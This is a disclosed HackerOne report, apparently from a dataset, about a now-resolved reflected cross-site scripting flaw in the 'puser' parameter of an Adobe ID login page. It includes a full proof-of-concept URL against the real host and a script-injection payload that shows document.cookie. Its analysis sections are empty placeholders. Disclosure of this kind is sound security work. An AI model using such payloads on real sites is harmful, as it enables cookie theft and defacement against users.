---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '50157'
original_report_id: '50157'
title: Reflected Cross Site Scripting - 'puser' Parameter in login page
weakness: Cross-site Scripting (XSS) - Generic
team_handle: adobe
created_at: '2015-03-05T13:37:33.295Z'
disclosed_at: '2015-05-09T16:44:20.297Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected Cross Site Scripting - 'puser' Parameter in login page

## Metadata

- HackerOne Report ID: 50157
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: adobe
- Disclosed At: 2015-05-09T16:44:20.297Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC URL: 
https://adobeid-na1.services.adobe.com/renga-idprovider/pages/login?callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSunbreakWebUI1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Faccounts.adobe.com%252F%253Fpromoid%253DKRUVI%2523from_ims%253Dtrue%2526old_hash%253D%2526client_id%253DSunbreakWebUI1%2526scope%253DAdobeID%25252Copenid%25252Csunbreak%25252Cacct_mgmt_webui%25252Cgnav%25252Cadditional_info.account_type%2526api%253Dauthorize%2526reauth%253Dcheck&client_id=SunbreakWebUI1&scope=AdobeID%2Copenid%2Csunbreak%2Cacct_mgmt_webui%2Cgnav%2Cadditional_info.account_type%2Creauthenticated&display=web_v2&denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2FSunbreakWebUI1%3Fredirect_uri%3Dhttps%253A%252F%252Faccounts.adobe.com%252F%253Fpromoid%253DKRUVI%2523from_ims%253Dtrue%2526old_hash%253D%2526client_id%253DSunbreakWebUI1%2526scope%253DAdobeID%25252Copenid%25252Csunbreak%25252Cacct_mgmt_webui%25252Cgnav%25252Cadditional_info.account_type%2526api%253Dauthorize%2526reauth%253Dcheck%26response_type%3Dtoken&relay=d366aa78-440c-4f26-98af-0527ebc6623d&locale=en_US&flow_type=token&dc=true&puser=1"><script>alert(document.cookie)</script><h1>Defaced!</h1>&eu=true&client_redirect=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fredirect%2FSunbreakWebUI1%3Fclient_redirect%3Dhttps%253A%252F%252Faccounts.adobe.com%252F%253Fpromoid%253DKRUVI%2523from_ims%253Dtrue%2526old_hash%253D%2526client_id%253DSunbreakWebUI1%2526scope%253DAdobeID%25252Copenid%25252Csunbreak%25252Cacct_mgmt_webui%25252Cgnav%25252Cadditional_info.account_type%2526api%253Dauthorize%2526reauth%253Dcheck&idp_flow_type=login&reauthenticate=check

Vulnerable Parameter: puser

Payload Used: 1"><script>alert(document.cookie)</script><h1>Defaced!</h1>

Steps to Reproduce: Just open above PoC URL in browser without valid session in it.

Vulnerability Description: https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29

Let me know if you need more info on same.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
